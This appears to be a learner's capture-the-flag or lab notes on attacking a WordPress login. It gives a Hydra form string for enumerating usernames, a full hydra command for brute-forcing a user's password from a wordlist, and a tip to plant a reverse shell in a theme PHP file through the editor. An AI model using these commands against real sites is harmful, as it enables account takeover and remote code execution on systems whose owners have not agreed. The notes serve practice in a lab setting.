


- need to check in the response if maybe there's "Invalid username" or something like that in reply, that means that we first need to bruteforce username, if it's (like it was here) an username from a wordlist and it was wordpress, use something liek this:

	/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1:Invalid username

-  once that is done

	hydra -l elliot -P fs-list <target-ip> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=The password you entered for the username" -t 30

	basically , after :F= you type the response you get.

	once you log in into the wordpress, go to Apperance > Editor and see if there are any php scripts, on which you put revshell.

most important thing to remember, **you can do this** . :)
